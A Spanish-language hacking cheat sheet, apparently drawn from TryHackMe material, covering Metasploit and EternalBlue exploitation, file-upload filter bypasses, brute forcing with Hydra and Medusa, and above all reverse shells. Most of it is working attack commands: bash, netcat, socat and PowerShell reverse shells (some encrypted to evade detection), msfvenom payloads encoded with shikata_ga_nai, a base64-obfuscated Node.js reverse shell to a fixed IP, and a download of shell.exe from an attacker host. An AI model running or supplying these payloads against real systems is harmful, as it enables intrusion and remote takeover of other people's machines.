### Enumeración de vulnerabilidades mediante Nmap

Para enumerar las vulnerabilidades de una máquina mediante Nmap, se puede utilizar el comando `nmap -sV --script vuln <IP>`. Este comando escanea los puertos abiertos y trata de identificar las vulnerabilidades de la máquina.

```bash
nmap -sV --script vuln <IP>
```

### Enumeración de vulnerabilidades mediante Metasploit

Para enumerar las vulnerabilidades de una máquina mediante Metasploit, se puede utilizar la herramienta `msfconsole`. Esta herramienta escanea la máquina en busca de vulnerabilidades y las enumera.

```bash
msfconsole
```

La enumeración de vulnerabilidades mediante Metasploit implica el uso de diferentes módulos y herramientas de escaneo para identificar vulnerabilidades en un sistema.

Para empezar, se debe abrir `msfconsole` y ejecutar el comando `db_nmap -sV <IP>`, para escanear los puertos abiertos y obtener información sobre los servicios que se están ejecutando.

Una vez que se tiene esta información, se pueden utilizar diferentes módulos para identificar vulnerabilidades en cada uno de los servicios. Por ejemplo, si se encuentra que un servicio está ejecutando una versión vulnerable de Apache, se puede utilizar el módulo `apache_users` para intentar enumerar usuarios y contraseñas.

Otro ejemplo es el módulo `ms17_010_eternalblue`, que se utiliza para explotar la vulnerabilidad EternalBlue en sistemas Windows. Este módulo se puede utilizar para obtener acceso a sistemas vulnerables y ejecutar comandos en ellos.

Existen muchos otros módulos disponibles en Metasploit para la enumeración de vulnerabilidades en diferentes sistemas y servicios. Para ver una lista completa de módulos, se puede ejecutar el comando `search <palabra clave>`.

```bash
msfconsole

# Escaneo de puertos y servicios
db_nmap -sV <IP>

# Enumeración de usuarios y contraseñas en Apache
use auxiliary/scanner/http/apache_users
set RHOSTS <IP>
run

# Explotación de la vulnerabilidad EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP>
run
```

Se puede usar el modulo de local_exploit_suggester una vez se ha obtenido acceso con meterpreter.

```bash
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.126.64 - Collecting local exploits for x64/linux...
```

# Fase de Explotación

## Upload Vulnerabilities

Lo abordaremos como un proceso paso a paso. Supongamos que nos han dado un sitio web para realizar una auditoría de seguridad.

1. Lo primero que haríamos es echar un vistazo al sitio web en general. Utilizando extensiones de navegador como el mencionado Wappalyzer (o a mano) buscaríamos indicadores de qué lenguajes y marcos de trabajo puede haber sido construido la aplicación web. Ten en cuenta que Wappalyzer no siempre es 100% preciso. Un buen comienzo para enumerar esto manualmente sería haciendo una solicitud al sitio web e interceptando la respuesta con Burpsuite. Cabeceras como "servidor" o "x-powered-by" se pueden utilizar para obtener información sobre el servidor. También estaríamos buscando vectores de ataque, como, por ejemplo, una página de carga.
2. Habiendo encontrado una página de carga, entonces apuntaríamos a inspeccionarla más a fondo. Mirando el código fuente de los scripts del lado del cliente para determinar si hay algún filtro del lado del cliente para omitir sería una buena cosa para empezar, ya que esto está completamente bajo nuestro control.
3. A continuación, intentaríamos una carga de archivo completamente inocente. Desde aquí, veríamos cómo se accede a nuestro archivo. En otras palabras, ¿podemos accederlo directamente en una carpeta de carga? ¿Está incrustado en alguna página? ¿Cuál es el esquema de nomenclatura del sitio web? Aquí es donde las herramientas como Gobuster podrían ser útiles si la ubicación no es inmediatamente obvia. Este paso es extremadamente importante ya que no sólo mejora nuestro conocimiento del paisaje virtual que estamos atacando, sino que también nos da un archivo "aceptado" base en el que podemos basar más pruebas.
    - Un parametro importante de Gobuster aquí es el parametro "x", que se puede utilizar para buscar archivos con extensiones específicas. Por ejemplo, si agregas "x php,txt,html" a tu comando de Gobuster, la herramienta agregaría ".php", ".txt" y ".html" a cada palabra en la lista de palabras seleccionada, una a la vez. Esto puede ser muy útil si has logrado cargar una carga útil y el servidor está cambiando el nombre de los archivos cargados.
    
    ```bash
    gobuster dir -u <URL> -w <WORDLIST> -x php
    ```
    

1. Habiendo determinado cómo y dónde se pueden acceder a nuestros archivos cargados, entonces intentaríamos una carga de archivo malicioso, evitando cualquier filtro del lado del cliente que encontramos en el paso dos. Esperaríamos que nuestra carga se detenga por un filtro del lado del servidor, pero el mensaje de error que nos da puede ser extremadamente útil para determinar nuestros próximos pasos.

Suponiendo que nuestra carga de archivo malicioso ha sido detenida por el servidor, aquí hay algunas formas de determinar qué tipo de filtro del lado del servidor puede estar en su lugar:

- Si puedes cargar con éxito un archivo con una extensión de archivo completamente no válida (por ejemplo, "testingimage.invalidfileextension"), entonces las posibilidades son que el servidor está utilizando una lista negra de extensiones para filtrar los archivos ejecutables. Si esta carga falla, cualquier filtro de extensión estará operando en una lista blanca.
- Intenta cargar de nuevo tu archivo inocente aceptado originalmente, pero esta vez cambia el número mágico del archivo a algo que esperarías que se filtrara. Si la carga falla, entonces sabes que el servidor está utilizando un filtro basado en el número mágico.
- Como en el punto anterior, intenta cargar tu archivo inocente, pero intercepta la solicitud con Burpsuite y cambia el tipo MIME de la carga a algo que esperarías que se filtrara. Si la carga falla, entonces sabes que el servidor está filtrando basado en tipos MIME.
- Enumerar los filtros de longitud de archivo es cuestión de cargar un archivo pequeño y luego cargar archivos cada vez más grandes hasta que llegues al filtro. En ese momento sabrás cuál es el límite aceptable. Si tienes mucha suerte, entonces el mensaje de error de la carga original puede decirte directamente cuál es el límite de tamaño. Ten en cuenta que un límite de longitud de archivo pequeño puede impedirte cargar la shell inversa que hemos estado utilizando hasta ahora.

[https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php (1)](https://www.notion.so/https-raw-githubusercontent-com-pentestmonkey-php-reverse-shell-master-php-reverse-shell-php-1-ec258cfcb09c4ddf9d059ecf765a6200?pvs=21)

[Lista completa de tipos MIME - HTTP | MDN (1)](https://www.notion.so/Lista-completa-de-tipos-MIME-HTTP-MDN-1-31344bd9b45a41968b735f8a77580a5e?pvs=21)

[File Upload - HackTricks (1)](https://www.notion.so/File-Upload-HackTricks-1-75222aa71692434a8fd3ffc217b3409b?pvs=21)

[List of file signatures - Wikipedia (1)](https://www.notion.so/List-of-file-signatures-Wikipedia-1-203dc77f84964fffa930c8f69e95230a?pvs=21)

## Reverse Shell

**Conceptos Clave:**

- **Reverse Shell**: Una conexión remota que permite al atacante controlar una máquina comprometida desde su propio sistema.
- **Payload**: Un conjunto de comandos o código malicioso que se inyecta en el sistema objetivo para establecer la reverse shell.

**Comandos Habitualmente Utilizados en la Configuración del Reverse Shell:**

1. **Generar Payload**: Crear un payload con herramientas como `msfvenom`:

```bash
msfvenom -p [payload] LHOST=[tu IP] LPORT=[puerto] -f [formato] -o [archivo de salida]
```

```bash
# Encode en base64 para ofuscar                                                      ✔ 

$ basenc --base64 sh.js > shell.js                                          
$ cat shell.js                                                              
IChmdW5jdGlvbigpeyB2YXIgcmVxdWlyZSA9IGdsb2JhbC5yZXF1aXJlIHx8IGdsb2JhbC5wcm9j
ZXNzLm1haW5Nb2R1bGUuY29uc3RydWN0b3IuX2xvYWQ7IGlmICghcmVxdWlyZSkgcmV0dXJuOyB2
YXIgY21kID0gKGdsb2JhbC5wcm9jZXNzLnBsYXRmb3JtLm1hdGNoKC9ed2luL2kpKSA/ICJjbWQi
IDogIi9iaW4vc2giOyB2YXIgbmV0ID0gcmVxdWlyZSgibmV0IiksIGNwID0gcmVxdWlyZSgiY2hp
bGRfcHJvY2VzcyIpLCB1dGlsID0gcmVxdWlyZSgidXRpbCIpLCBzaCA9IGNwLnNwYXduKGNtZCwg
W10pOyB2YXIgY2xpZW50ID0gdGhpczsgdmFyIGNvdW50ZXI9MDsgZnVuY3Rpb24gU3RhZ2VyUmVw
ZWF0KCl7IGNsaWVudC5zb2NrZXQgPSBuZXQuY29ubmVjdCg0NDU1LCAiMTAuMTQuNTAuMTg0Iiwg
ZnVuY3Rpb24oKSB7IGNsaWVudC5zb2NrZXQucGlwZShzaC5zdGRpbik7IGlmICh0eXBlb2YgdXRp
bC5wdW1wID09PSAidW5kZWZpbmVkIikgeyBzaC5zdGRvdXQucGlwZShjbGllbnQuc29ja2V0KTsg
c2guc3RkZXJyLnBpcGUoY2xpZW50LnNvY2tldCk7IH0gZWxzZSB7IHV0aWwucHVtcChzaC5zdGRv
dXQsIGNsaWVudC5zb2NrZXQpOyB1dGlsLnB1bXAoc2guc3RkZXJyLCBjbGllbnQuc29ja2V0KTsg
fSB9KTsgc29ja2V0Lm9uKCJlcnJvciIsIGZ1bmN0aW9uKGVycm9yKSB7IGNvdW50ZXIrKzsgaWYo
Y291bnRlcjw9IDEwKXsgc2V0VGltZW91dChmdW5jdGlvbigpIHsgU3RhZ2VyUmVwZWF0KCk7fSwg
NSoxMDAwKTsgfSBlbHNlIHByb2Nlc3MuZXhpdCgpOyB9KTsgfSBTdGFnZXJSZXBlYXQoKTsgfSko
KTs=
```

1. **Ejecutar Payload en la Víctima**: Hacer que la víctima ejecute el payload generado, por ejemplo, usando un exploit en una aplicación vulnerable.

### Bash shell

```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

1. `bash -i`: Esto inicia una sesión interactiva de la shell Bash en la máquina objetivo, permitiendo al atacante ejecutar comandos en el sistema remoto.
2. `>& /dev/tcp/10.10.10.10/4444`: Esta parte del comando redirige la salida estándar (stdout) y la salida de error estándar (stderr) de la shell hacia un socket de red TCP. Esto establece una conexión a través de la dirección IP `10.10.10.10` en el puerto `4444`, permitiendo que los datos fluyan entre el atacante y la máquina objetivo.
3. `0>&1`: Aquí, la entrada estándar (stdin) de la shell se redirige al mismo socket de red TCP. Esto significa que los comandos que el atacante escriba en su terminal también serán enviados a través de la conexión TCP hacia la shell en la máquina objetivo.

**Netcat Bind Shell:**

En algunas versiones de Netcat, como `nc.exe` en Windows y `netcat-traditional` en Kali, se puede usar la opción `-e` para ejecutar un proceso al conectarse. Por ejemplo, como oyente:

```bash
nc -lvnp <PUERTO> -e /bin/bash
```

Esta opción es vista como insegura en muchas versiones de Netcat.

**Netcat Reverse Shell:**

Un shell inverso puede establecerse usando Netcat. Para ello, se utiliza la sintaxis de conexión en lugar de la de escucha:

```bash
mkfifo /tmp/f; nc <IP_LOCAL> <PUERTO> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

### Estabilizar la reverse shell

**Técnica 1: Python**

La primera técnica que discutiremos es aplicable solo a sistemas Linux, ya que casi siempre tendrán Python instalado por defecto. Este es un proceso de tres etapas:

1. Lo primero que debemos hacer es utilizar el siguiente comando:
    
    ```bash
    python -c 'import pty;pty.spawn("/bin/bash")'
    ```
    
    Este comando utiliza Python para generar una shell Bash con características mejoradas. Ten en cuenta que algunos objetivos pueden necesitar una versión específica de Python. Si este es el caso, reemplaza `python` con `python2` o `python3` según sea necesario. En este punto, nuestra shell se verá un poco más completa, pero aún no podremos utilizar la autocompletación con la tecla Tab ni las teclas de flecha, y Ctrl + C seguirá terminando la shell.
    
2. El segundo paso es exportar la variable de entorno `TERM` para habilitar comandos de terminal como `clear`:
    
    ```bash
    export TERM=xterm
    ```
    
3. Finalmente (y lo más importante), vamos a poner en segundo plano la shell utilizando Ctrl + Z. Luego, en nuestra propia terminal, ejecutamos el siguiente comando:
    
    ```bash
    stty raw -echo; fg
    ```
    
    Esto hace dos cosas: primero, desactiva el eco en nuestra propia terminal (lo que nos permite utilizar la autocompletación con la tecla Tab, las teclas de flecha y Ctrl + C para terminar procesos). Luego, pone en primer plano la shell, completando así el proceso.
    
    **Restablecer la Terminal si la Shell Muere**: Si la shell muere y la entrada en tu propia terminal ya no es visible (debido a que se desactivó el eco de terminal), puedes solucionar esto escribiendo el comando `reset` y presionando Enter.
    
    **Técnica 2: rlwrap**
    
    `rlwrap` es un programa que, en términos simples, nos brinda acceso inmediato al historial, la autocompletación con la tecla Tab y las teclas de flecha tan pronto como recibimos una shell; sin embargo, aún debemos utilizar una estabilización manual si deseamos usar Ctrl + C dentro de la shell. `rlwrap` no está instalado por defecto en Kali, por lo que primero debes instalarlo con el comando `sudo apt install rlwrap`.
    
    Para usar `rlwrap`, invocamos un listener de netcat ligeramente diferente:
    
    ```bash
    rlwrap nc -lvnp <puerto>
    ```
    
    Agregar "rlwrap" antes de nuestro listener de netcat nos brinda una shell mucho más completa en características. Esta técnica es particularmente útil cuando se trata de shells de Windows, que de lo contrario son conocidos por ser difíciles de estabilizar. Al tratar con un objetivo Linux, es posible estabilizar por completo utilizando el mismo truco que en el paso tres de la técnica anterior: poner en segundo plano la shell con Ctrl + Z, luego usar `stty raw -echo; fg` para estabilizar y volver a entrar en la shell.
    
    **Técnica 3: Socat**
    
    La tercera forma sencilla de estabilizar una shell es simplemente utilizar una shell inicial de netcat como un punto de entrada hacia una shell de socat más completa en características. Ten en cuenta que esta técnica está limitada a objetivos Linux, ya que una shell de Socat en Windows no será más estable que una shell de netcat. Para lograr este método de estabilización, primero transferimos un archivo binario estático de socat (una versión del programa compilada sin dependencias) a la máquina objetivo. Una forma típica de lograr esto sería mediante un servidor web en la máquina atacante en el directorio que contiene tu binario de socat (`sudo python3 -m http.server 80`), y luego, en la máquina objetivo, usar la shell de netcat para descargar el archivo. En Linux, esto se lograría con `curl` o `wget` (por ejemplo, `wget <IP-LOCAL>/socat -O /tmp/socat`).
    
    ...
    
    **Cambiar el Tamaño de la TTY:**
    
    Con cualquiera de las técnicas anteriores, es útil poder cambiar el tamaño de tu terminal tty. Esto es algo que tu terminal hará automáticamente al usar una shell regular; sin embargo, debe hacerse manualmente en una shell inversa o de enlace si deseas usar algo como un editor de texto que sobrescribe todo en la pantalla.
    
    Primero, abre otra terminal y ejecuta `stty -a`. Esto te dará una gran cantidad de información de salida. Anota los valores para "rows" y "columns".
    
    Luego, en tu shell inversa o de enlace, ingresa:
    
    ```bash
    stty rows <número>
    ```
    
    y
    
    ```bash
    stty cols <número>
    ```
    
    Sustituye los números por los valores que obtuviste al ejecutar el comando en tu propia terminal.
    
    Esto cambiará el ancho y alto registrados de la terminal, permitiendo que programas como editores de texto que dependen de esta información abran correctamente.
    
    Recuerda utilizar estas técnicas de manera ética y legal, y solo en sistemas y redes para los cuales tengas permiso explícito. La ciberseguridad ética es esencial para mantener la integridad y la confianza en este campo.
    
    ### **Socat: Una Herramienta de Conexión Versátil**
    
    Socat es una herramienta que conecta puntos en diferentes sistemas. Imagina un conector entre dos lugares. Puede ser un puerto de escucha y el teclado, o incluso dos puertos de escucha. Es como la pistola de portales en el juego Portal.
    
    **Reverse Shells (Shells Inversas)**
    
    - Para escuchar una shell inversa básica en socat en Linux:
        
        ```bash
        socat TCP-L:<puerto> -
        ```
        
    - Para conectarte desde Windows:
        
        ```bash
        socat TCP:<IP-LOCAL>:<PUERTO-LOCAL> EXEC:powershell.exe,pipes
        ```
        
    - Para conectarte desde Linux:
        
        ```bash
        socat TCP:<IP-LOCAL>:<PUERTO-LOCAL> EXEC:"bash -li"
        ```
        
    
    **Bind Shells (Shells de Enlace)**
    
    - En Linux:
        
        ```bash
        socat TCP-L:<PUERTO> EXEC:"bash -li"
        ```
        
    - En Windows:
        
        ```bash
        socat TCP-L:<PUERTO> EXEC:powershell.exe,pipes
        ```
        
    - Conéctate en tu máquina atacante:
        
        ```bash
        socat TCP:<IP-OBJETIVO>:<PUERTO-OBJETIVO> -
        ```
        
    
    **Shell Linux tty Inversa Totalmente Estable**
    
    Para una shell tty inversa más estable en Linux:
    
    ```bash
    socat TCP-L:<puerto> FILE:`tty`,raw,echo=0
    ```
    
    Activa el escucha especial en el objetivo:
    
    ```bash
    socat TCP:<IP-ATACANTE>:<PUERTO-ATACANTE> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
    ```
    
    - **Uso de Comando Adicional en el Sistema Remoto**:
        1. Para activar el escucha especial en el sistema objetivo, se utiliza un comando Socat especial que contiene opciones como `EXEC:` seguidas de comandos, como `bash -li`, `pty`, `stderr`, `sigint`, `setsid`, y `sane`.
        2. Estas opciones son cruciales para estabilizar y controlar la sesión inversa, permitiendo que los comandos enviados desde el sistema atacante se ejecuten sin interrupciones y que la shell permanezca interactiva.

A la izquierda tenemos un oyente que se ejecuta en nuestra máquina de ataque local, a la derecha tenemos una simulación de un objetivo comprometido, que se ejecuta con un shell no interactivo. Usando el shell netcat no interactivo, ejecutamos el comando especial socat y recibimos un shell bash completamente interactivo en el oyente socat a la izquierda:

![Untitled](Hacking%20CheatSheet%20b16f2e1230624ec0b0cb325a92426449/Untitled.png)

### Socat binary

[https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)

[socat](Hacking%20CheatSheet%20b16f2e1230624ec0b0cb325a92426449/socat.txt)

### **Creación de Shells Encriptadas con Socat**

Las shells encriptadas no pueden ser espiadas a menos que tengas la clave de desencriptación y a menudo pueden evadir un Sistema de Detección de Intrusiones (IDS) como resultado.

**Generar un Certificado**

1. Primero, necesitamos generar un certificado para poder usar shells encriptadas. Esto es más fácil de hacer en nuestra máquina atacante:
    
    ```bash
    openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
    ```
    
    Este comando crea una clave RSA de 2048 bits con el archivo de certificado correspondiente, autofirmado y válido por poco menos de un año. Cuando ejecutes este comando, te pedirá que completes información sobre el certificado. Esto se puede dejar en blanco o completar de manera aleatoria.
    
2. Luego, necesitamos fusionar los dos archivos creados en un solo archivo .pem:
    
    ```bash
    cat shell.key shell.crt > shell.pem
    ```
    

**Configuración del Listener de Shell Inversa Encriptada**

Al configurar el escucha de la shell inversa, usamos:

```bash
socat OPENSSL-LISTEN:<PUERTO>,cert=shell.pem,verify=0 -
```

Esto establece un escucha OPENSSL utilizando el certificado que generamos. `verify=0` le indica a la conexión que no intente validar que nuestro certificado haya sido correctamente firmado por una autoridad reconocida. Ten en cuenta que el certificado debe usarse en el dispositivo que está escuchando.

**Conexión de Regreso**

Para conectarse de regreso, usaríamos:

```bash
socat OPENSSL:<IP-LOCAL>:<PUERTO-LOCAL>,verify=0 EXEC:/bin/bash
```

**Ejemplo de Shell de Enlace Encriptada**

En un objetivo de Windows:

Objetivo:

```bash
socat OPENSSL-LISTEN:<PUERTO>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```

Atacante:

```bash
socat OPENSSL:<IP-OBJETIVO>:<PUERTO-OBJETIVO>,verify=0 -
```

Nuevamente, recuerda que incluso para un objetivo de Windows, el certificado debe usarse con el escucha, por lo que se requiere copiar el archivo PEM para un shell de enlace.

![Untitled](Hacking%20CheatSheet%20b16f2e1230624ec0b0cb325a92426449/Untitled%201.png)

Ejemplo shell encriptada para objetivo linux:

```bash
# Atacante
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0

# Objetivo
socat OPENSSL:10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

**PowerShell Reverse Shell:**

En servidores Windows modernos, un shell inverso de PowerShell es comúnmente utilizado. Aquí se presenta un comando de PowerShell complejo pero poderoso:

```powershell
powershell -c "$cliente = New-Object System.Net.Sockets.TCPClient('<ip>',<puerto>);$stream = $cliente.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$cliente.Close()"
```

URL encoded:

```html
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.11.49.3%27%2C1234%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

Descargar archivo en CMD o Powershell

```bash
powershell -c 'Invoke-WebRequest -Uri http://10.14.50.184/shell-name.exe -OutFile C:\Windows\temp\shell.exe'
```

### **Meterpreter Reverse TCP WINDOWS**

**1. Generación del Payload:**

- Utilizamos la herramienta `msfvenom` que es parte del Framework Metasploit para generar el payload.
- El objetivo es crear un ejecutable de 64 bits (`windows/x64/meterpreter/reverse_tcp`) que se conectará de vuelta a la máquina atacante.
- Comando:

```powershell
# Normal
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.11.49.3 LPORT=1234

# Encriptado con shikata_ga_nai 
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -f exe -o shell.exe LHOST=192.168.56.1 LPORT=4444
```

- `p`: Indica el payload que se usará.
- `f`: Formato del archivo de salida (en este caso, un ejecutable `.exe`).
- `o`: Nombre del archivo de salida (en este caso, `shell.exe`).
- `LHOST`: Dirección IP de la máquina atacante.
- `LPORT`: Puerto al que el payload intentará conectarse.

**2. Transferencia del Payload a la Máquina Objetivo:**

- Transfieres el archivo `shell.exe` generado a la máquina objetivo. Puede ser a través de métodos como USB, correo electrónico, descarga desde un sitio web, etc.

**3. Ejecución del Payload en la Máquina Objetivo:**

- En la máquina objetivo, ejecutas el archivo `shell.exe`.
- Esto establecerá una conexión de retorno desde la máquina objetivo a la máquina atacante a través del puerto y dirección IP especificados.

**4. Configuración y Ejecución del Multihandler:**

- En la máquina atacante, abres la consola de Metasploit Framework (`msfconsole`).
- Inicias el "multihandler" que escuchará las conexiones de retorno del payload.
- Comandos:
    - `msfconsole` (para abrir la consola).
    - `use exploit/multi/handler` (para seleccionar el módulo del multihandler).
    - `set PAYLOAD windows/x64/meterpreter/reverse_tcp` (configuras el payload a utilizar).
    - `set LHOST <tu dirección IP>` (configuras la dirección IP de la máquina atacante).
    - `set LPORT 1234` (configuras el puerto a escuchar, debe coincidir con el puerto especificado en el payload).
    - `exploit` o `run` (inicias el multihandler y esperas a que se establezca la conexión).

**5. Conexión Exitosa y Acceso a la Máquina Objetivo:**

- Una vez que la máquina objetivo ejecuta el payload, se establecerá una conexión inversa con el multihandler en la máquina atacante.
- Desde este punto, tendrás acceso a la máquina objetivo utilizando las capacidades de Meterpreter, permitiéndote ejecutar comandos, obtener información y realizar diversas acciones.

### **Meterpreter Reverse TCP para Linux**

**1. Generación del Payload:**

- Utilizamos nuevamente la herramienta `msfvenom`, pero esta vez para generar un payload compatible con sistemas Linux.
- El objetivo es crear un archivo ejecutable ELF de 64 bits (`linux/x64/meterpreter/reverse_tcp`) que se conectará de vuelta a la máquina atacante.
- Comando: `msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443`
    - `p`: Indica el payload a utilizar.
    - `f`: Formato del archivo de salida (en este caso, un archivo ejecutable ELF).
    - `o`: Nombre del archivo de salida (en este caso, `shell`).
    - `LHOST`: Dirección IP de la máquina atacante.
    - `LPORT`: Puerto al que el payload intentará conectarse.

**2. Transferencia del Payload a la Máquina Objetivo:**

- Al igual que antes, debes transferir el archivo `shell` generado a la máquina objetivo.

**3. Ejecución del Payload en la Máquina Objetivo:**

- En la máquina objetivo, debes asegurarte de que el archivo `shell` tenga permisos de ejecución (`chmod +x shell`).
- Luego, ejecutas el archivo `shell`.
- Esto establecerá una conexión de retorno desde la máquina objetivo a la máquina atacante a través del puerto y dirección IP especificados.

**4. Configuración y Ejecución del Multihandler:**

- En la máquina atacante, abres la consola de Metasploit Framework (`msfconsole`).
- Inicias el "multihandler" de manera similar al proceso anterior.
- Comandos:
    - `msfconsole` (para abrir la consola).
    - `use exploit/multi/handler` (para seleccionar el módulo del multihandler).
    - `set PAYLOAD linux/x64/meterpreter/reverse_tcp` (configuras el payload a utilizar).
    - `set LHOST <tu dirección IP>` (configuras la dirección IP de la máquina atacante).
    - `set LPORT 443` (configuras el puerto a escuchar, debe coincidir con el puerto especificado en el payload).
    - `exploit` o `run` (inicias el multihandler y esperas a que se establezca la conexión).

**5. Conexión Exitosa y Acceso a la Máquina Objetivo:**

- Una vez que la máquina objetivo ejecuta el payload, se establecerá una conexión inversa con el multihandler en la máquina atacante.

### **Upgrading shells to Meterpreter**

- **Abre Metasploit:** Asegúrate de que Metasploit Framework esté en funcionamiento. Si no lo has hecho aún, abre una terminal y ejecuta `msfconsole`.
- **Actualizar a Meterpreter usando `sessions`:** Puedes usar el comando `sessions` para actualizar una sesión existente a Meterpreter. Si tienes una sesión Meterpreter existente y deseas actualizarla, ejecuta lo siguiente:

```bash
sessions -u <ID_de_la_Sesión>
```

Reemplaza `<ID_de_la_Sesión>` con el ID de la sesión que deseas actualizar.

- **Actualizar la sesión más reciente a Meterpreter:** Si deseas actualizar la sesión más reciente a Meterpreter, puedes utilizar `1` como ID de sesión para referirte a la sesión más reciente. Ejecuta:

```bash
sessions -u -1
```

- **Usar el módulo `shell_to_meterpreter` manualmente:** También puedes actualizar una sesión a Meterpreter utilizando el módulo `shell_to_meterpreter`. Ejecuta estos comandos en la terminal de Metasploit:

```arduino
use multi/manage/shell_to_meterpreter
run session=-1
run session=-1 win_transfer=POWERSHELL
run session=-1 win_transfer=VBS
```

Estos comandos cargarán el módulo `shell_to_meterpreter`, seleccionarán la sesión más reciente (utilizando `-1` como ID de sesión) y ejecutarán el módulo con dos opciones de transferencia diferentes: `POWERSHELL` y `VBS`.

**PayloadsAllTheThings:**

Para encontrar más opciones de cargas útiles de shell inverso, puedes explorar el repositorio "PayloadsAllTheThings". Este repositorio contiene una variedad de códigos de shell inverso en diferentes lenguajes. Puedes acceder a él para obtener más detalles.

https://github.com/swisskyrepo/PayloadsAllTheThings

Fuente info: [https://tryhackme.com/room/introtoshells](https://tryhackme.com/room/introtoshells)

## Ataques de fuerza bruta

### Ataques de fuerza bruta mediante Hydra

Para realizar un ataque de fuerza bruta a una máquina, se puede utilizar la herramienta `hydra`. Esta herramienta intenta adivinar la contraseña de una cuenta mediante un diccionario de contraseñas.

```bash
hydra -l <USERNAME> -P <PATH_TO_PASSWORD_LIST> <IP> <SERVICIO>
```

### Ataques de fuerza bruta mediante Medusa

Para realizar un ataque de fuerza bruta a una máquina, se puede utilizar la herramienta `medusa`. Esta herramienta intenta adivinar la contraseña de una cuenta mediante un diccionario de contraseñas.

```bash
medusa -u <USERNAME> -P <PATH_TO_PASSWORD_LIST> -h <IP> -M <SERVICIO>
```

## Explotación de vulnerabilidades

### Explotación de vulnerabilidades mediante Metasploit

Para explotar una vulnerabilidad de una máquina mediante Metasploit, se puede utilizar la herramienta `msfconsole`. Esta herramienta busca vulnerabilidades en la máquina y las explota.

```bash
msfconsole
```

La explotación de vulnerabilidades mediante Metasploit implica el uso de diferentes módulos y herramientas de escaneo para identificar vulnerabilidades en un sistema.

Para empezar, se debe abrir `msfconsole` y ejecutar el comando `db_nmap -sV <IP>`, para escanear los puertos abiertos y obtener información sobre los servicios que se están ejecutando.

Una vez que se tiene esta información, se pueden utilizar diferentes módulos para identificar vulnerabilidades en cada uno de los servicios. Por ejemplo, si se encuentra que un servicio está ejecutando una versión vulnerable de Apache, se puede utilizar el módulo `apache_users` para intentar enumerar usuarios y contraseñas.

Otro ejemplo es el módulo `ms17_010_eternalblue`, que se utiliza para explotar la vulnerabilidad EternalBlue en sistemas Windows. Este módulo se puede utilizar para obtener acceso a sistemas vulnerables y ejecutar comandos en ellos.

Existen muchos otros módulos disponibles en Metasploit para la enumeración de vulnerabilidades en diferentes sistemas y servicios. Para ver una lista completa de módulos, se puede ejecutar el comando `search <palabra clave>`.

```bash
msfconsole

# Escaneo de puertos y servicios
db_nmap -sV <IP>

# Enumeración de usuarios y contraseñas en Apache
use auxiliary/scanner/http/apache_users
set RHOSTS <IP>
run

# Explotación de la vulnerabilidad EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP>
run
```

### Local Exploit Suggester

Una vez obtenido acceso con metasploit y teniendo una sesión abierta, una opción rápida (especialmente para los CTF) es usar `post/multi/recon/local_exploit_suggester`

```bash
# En mestasploit
use post/multi/recon/local_exploit_suggester

# Seleccionar la sesión
set SESSION <numero_sesion>

# Ejecutar
run
```

### Explotación de vulnerabilidades mediante ExploitDB

Para explotar una vulnerabilidad de una máquina mediante ExploitDB, se puede utilizar el comando `searchsploit <VULNERABILIDAD>`. Este comando busca exploits para la vulnerabilidad especificada.

```bash
searchsploit <VULNERABILIDAD>
searchsploit <SOFTWARE>
searchsploit -x <ID_EXPLOIT> # Inspeccionar el código del exploit
searchsploit -m <ID_EXPLOIT> # Mueve el exploit al directorio actual de trabajo
```

### Explotación de vulnerabilidades mediante manual

Para explotar una vulnerabilidad de una máquina mediante un manual, se puede buscar información en internet sobre la vulnerabilidad y cómo explotarla.

Algunos recursos para buscar y explotar vulnerabilidades de forma manual incluyen:

- [Exploit Database](https://www.exploit-db.com/): una base de datos de exploits y vulnerabilidades conocidas.
- [Vulners](https://vulners.com/): un motor de búsqueda de vulnerabilidades y exploits.
